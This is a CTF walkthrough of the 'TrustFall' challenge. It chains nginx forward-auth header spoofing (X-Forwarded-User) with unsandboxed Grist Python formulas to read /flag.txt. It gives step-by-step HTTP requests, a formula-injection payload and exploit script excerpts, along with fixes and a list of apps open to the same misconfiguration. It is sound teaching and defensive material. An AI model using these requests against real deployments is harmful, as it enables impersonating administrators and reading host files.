# TrustFall - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | nginx (port 8484) → Grist spreadsheet app (port 8000, internal) |
| Flag location | `/flag.txt` |
| Vulnerability chain | Forward-auth header injection → unsandboxed Python formula RCE |

---

## Overview - How The App Works

```
[You] ──→ nginx (port 8484, public)
               │
               └──→ Grist app (port 8000, internal only)
```

[Grist](https://github.com/gristlabs/grist-core) is an open-source spreadsheet / database application. It supports Python formulas in spreadsheet cells - full Python, not just a formula language. A sandbox (gVisor or pyodide) normally isolates those formulas from the host OS.

Two private documents are pre-seeded in an "Operations" workspace, accessible only to the install admin (`alex.caldwell@grist.htb`).

**Goal:** read `/flag.txt`. The only path there is:

```
POST /api/docs/{id}/apply  (inject a Python formula column)
  └─ GET /api/docs/{id}/tables/Runbook/records
       └─ Grist evaluates the formula → returns file contents as a cell value
```

Full chain needed: **become admin without credentials → execute arbitrary Python formula**.

---

## Bug 1 - Forward-Auth Header Not Stripped by nginx

**File:** `nginx/default.conf`

### How forward-auth is supposed to work

Grist is designed to operate behind a trusted SSO proxy (Authelia, oauth2-proxy, etc.). The proxy authenticates the user and then sets a header like `X-Forwarded-User: user@example.com`. Grist reads that header and treats the email as the authenticated identity - no password check of its own.

**This design is only safe if the reverse proxy strips any client-supplied value of that header and replaces it with one derived from a real authentication check.**

### The Dockerfile env configuration

```dockerfile
# Dockerfile

ENV GRIST_FORWARD_AUTH_HEADER=X-Forwarded-User
# ↑ Grist will read this header to identify the logged-in user

ENV GRIST_IGNORE_SESSION=true
# ↑ No session cookie validation - auth is 100% header-driven

ENV GRIST_DEFAULT_EMAIL=alex.caldwell@grist.htb
# ↑ This email is automatically the install admin
```

### The nginx config - the critical omission

```nginx
# nginx/default.conf

server {
  listen 8484;

  location / {
    proxy_pass http://127.0.0.1:8000;
    proxy_http_version 1.1;
    proxy_buffering off;
    proxy_set_header Host             $http_host;
    proxy_set_header X-Real-IP        $remote_addr;
    proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    # ← NO proxy_set_header X-Forwarded-User ...
    # ← Header passes through UNCHANGED from the client request
  }
}
```

nginx proxies the `X-Forwarded-User` header from the client to Grist without ever setting it. A client-supplied header reaches Grist verbatim.

### The exploit

```
GET /api/session/access/active
X-Forwarded-User: alex.caldwell@grist.htb
```

Grist reads the header, looks up `alex.caldwell@grist.htb`, and returns:

```json
{
  "user": {
    "email": "alex.caldwell@grist.htb",
    "isInstallAdmin": true
  }
}
```

We are now the install admin with full access to all workspaces and documents.

### The fix

The proxy must **explicitly set** the header - not just pass it through. The client value must be overwritten:

```nginx
# WRONG - attacker controls X-Forwarded-User
location / {
    proxy_pass http://127.0.0.1:8000;
    # header not set → passes through from client
}

# CORRECT - proxy derives identity from its own auth check, not the client
location / {
    auth_request /auth;
    auth_request_set $user $upstream_http_x_auth_request_user;
    proxy_set_header X-Forwarded-User $user;  # overwrite client value
    proxy_pass http://127.0.0.1:8000;
}
```

Or at minimum, strip it if not using forward-auth:

```nginx
proxy_set_header X-Forwarded-User "";  # clear any client-supplied value
```

### Real-world impact

This exact misconfiguration affects any app using header-based auth:

| App | Header |
|---|---|
| Grafana (`auth.proxy.enabled = true`) | `X-WEBAUTH-USER` |
| Kibana (with proxy auth) | `X-Remote-User` |
| Grist | `X-Forwarded-User` |
| oauth2-proxy downstream apps | `X-Auth-Request-Email` |
| Gitea / Forgejo (reverse proxy auth) | `X-Webauth-Username` |

---

## Bug 2 - Unsandboxed Python Formula Execution (RCE)

**File:** `Dockerfile`

### How Grist formulas work

Grist cells can contain Python formulas - not a restricted formula language, but full CPython. When a record is fetched, Grist evaluates any formula columns and returns the result as the cell value.

A normal production deployment uses a sandbox (gVisor or pyodide) to isolate formula execution from the host filesystem and network. This challenge disables the sandbox:

```dockerfile
# Dockerfile

ENV GRIST_SANDBOX_FLAVOR=unsandboxed
# ↑ No gVisor, no pyodide - formulas execute directly in the Grist process,
#   on the host OS, as the user running the Grist process
```

### Adding a formula column via the API

The `/api/docs/{docId}/apply` endpoint accepts a list of Grist "docactions" - low-level operations that modify the document schema or data. The `AddColumn` action adds a column with a Python formula:

```json
POST /api/docs/{docId}/apply
X-Forwarded-User: alex.caldwell@grist.htb
Content-Type: application/json

[
  ["AddColumn", "Runbook", "Flag_x", {
    "type": "Text",
    "isFormula": true,
    "formula": "open('/flag.txt').read()"
  }]
]
```

Because `GRIST_SANDBOX_FLAVOR=unsandboxed`, `open('/flag.txt').read()` runs as raw Python with direct host OS access. The result is stored as the column's computed value.

### Reading the formula output

```
GET /api/docs/{docId}/tables/Runbook/records
X-Forwarded-User: alex.caldwell@grist.htb
```

Response:

```json
{
  "records": [
    {
      "id": 1,
      "fields": {
        "Topic": "Formula runtime compatibility",
        "Status": "Temporary exception",
        "Notes": "Legacy workbooks still rely on Python formulas...",
        "Flag_x": "HTB{...flag contents...}\n"
      }
    }
  ]
}
```

### The fix

Never disable the sandbox in production. Grist's default is sandboxed. The `GRIST_SANDBOX_FLAVOR=unsandboxed` env var is the only thing enabling this attack:

```
# WRONG
ENV GRIST_SANDBOX_FLAVOR=unsandboxed

# CORRECT - omit entirely (default is sandboxed) or set explicitly
ENV GRIST_SANDBOX_FLAVOR=gvisor
```

Even with the sandbox enabled, the auth header injection (Bug 1) would still give admin access to all documents and data - the sandbox only prevents formula-based OS access.

---

## Full Exploit Chain

```
Step 1: Send any request with X-Forwarded-User: alex.caldwell@grist.htb
         └─ nginx passes header through unchanged
         └─ Grist trusts header → we are install admin

Step 2: List workspaces to find the private "Automation-Lab" doc ID
         └─ GET /api/orgs/current/workspaces

Step 3: Inject a Python formula column into the Runbook table
         └─ POST /api/docs/{docId}/apply
         └─ formula: open('/flag.txt').read()
         └─ GRIST_SANDBOX_FLAVOR=unsandboxed → executes on host

Step 4: Fetch records to read the formula output
         └─ GET /api/docs/{docId}/tables/Runbook/records
         └─ Flag_x field contains /flag.txt contents
```

---

## Step-by-Step HTTP Requests

### Step 1 - Confirm auth bypass

```http
GET /api/session/access/active HTTP/1.1
Host: <target>:8484
X-Forwarded-User: alex.caldwell@grist.htb
```

Expected response:

```json
{
  "user": {
    "email": "alex.caldwell@grist.htb",
    "isInstallAdmin": true,
    "loginMethod": "Email + Password"
  }
}
```

### Step 2 - Find the private doc ID

```http
GET /api/orgs/current/workspaces HTTP/1.1
Host: <target>:8484
X-Forwarded-User: alex.caldwell@grist.htb
```

Response contains both workspaces. Look for the doc with `urlId = "automation-lab"` and note its numeric `id`.

### Step 3 - Inject Python formula

```http
POST /api/docs/automation-lab/apply HTTP/1.1
Host: <target>:8484
X-Forwarded-User: alex.caldwell@grist.htb
Content-Type: application/json

[["AddColumn","Runbook","Flag_x",{"type":"Text","isFormula":true,"formula":"open('/flag.txt').read()"}]]
```

Grist accepts `urlId` ("automation-lab") directly in the path, so numeric doc ID lookup is optional.

### Step 4 - Read the flag

```http
GET /api/docs/automation-lab/tables/Runbook/records HTTP/1.1
Host: <target>:8484
X-Forwarded-User: alex.caldwell@grist.htb
```

The `Flag_x` field in the first record contains the flag.

---

## Challenge Lore (Why It Makes Sense In-World)

The seed data paints a picture: `alex.caldwell@grist.htb` is managing SSO rollout for Korvia government agencies. The private "Automation-Lab" document contains an `Intel` table with entries noting that "SSO gateway deployed without header sanitization audit" and "sandbox migration deferred - Python runtime remains active." The challenge name "TrustFall" is a direct reference to the blind trust of the forwarded header.

---

## Running the Exploit Script

```bash
# Basic run
python3 exploit_trustfall.py http://<target-ip>:<port>

# Through Burp Suite (default 127.0.0.1:8080)
python3 exploit_trustfall.py http://<target-ip>:<port> --proxy

# Custom proxy address
python3 exploit_trustfall.py http://<target-ip>:<port> --proxy http://127.0.0.1:8080

# Disable TLS verification (useful when Burp intercepts HTTPS)
python3 exploit_trustfall.py https://<target-ip>:<port> --proxy --no-verify
```

### What the script does

```python
# exploit_trustfall.py (key parts)

# All requests carry the spoofed admin header
s.headers["X-Forwarded-User"] = "alex.caldwell@grist.htb"

# Step 1: confirm we're admin
info = api("GET", "/api/session/access/active")

# Step 2: find the private doc ID
for ws in api("GET", "/api/orgs/current/workspaces"):
    for doc in ws.get("docs", []):
        if doc.get("urlId") == "automation-lab":
            doc_id = doc["id"]

# Step 3: inject formula column
api("POST", f"/api/docs/{doc_id}/apply", json=[
    ["AddColumn", "Runbook", "Flag_x", {
        "type": "Text",
        "isFormula": True,
        "formula": "open('/flag.txt').read()"
    }]
])

# Step 4: read output
result = api("GET", f"/api/docs/{doc_id}/tables/Runbook/records")
flag = result["records"][0]["fields"]["Flag_x"]
```

---

## Key Takeaways

| Concept | Detail |
|---|---|
| Forward-auth header injection | Any header-trusted app is vulnerable if the proxy doesn't explicitly overwrite the header |
| `GRIST_IGNORE_SESSION=true` | Removes the only second factor - no session cookie check means the header is the sole auth mechanism |
| `GRIST_SANDBOX_FLAVOR=unsandboxed` | Converts a spreadsheet formula into an unrestricted OS command |
| Grist `AddColumn` docaction | The Grist REST API accepts arbitrary schema modifications including formula injection via `/apply` |
| urlId vs numeric docId | Grist accepts the human-readable `urlId` directly in API paths - no numeric ID lookup needed |
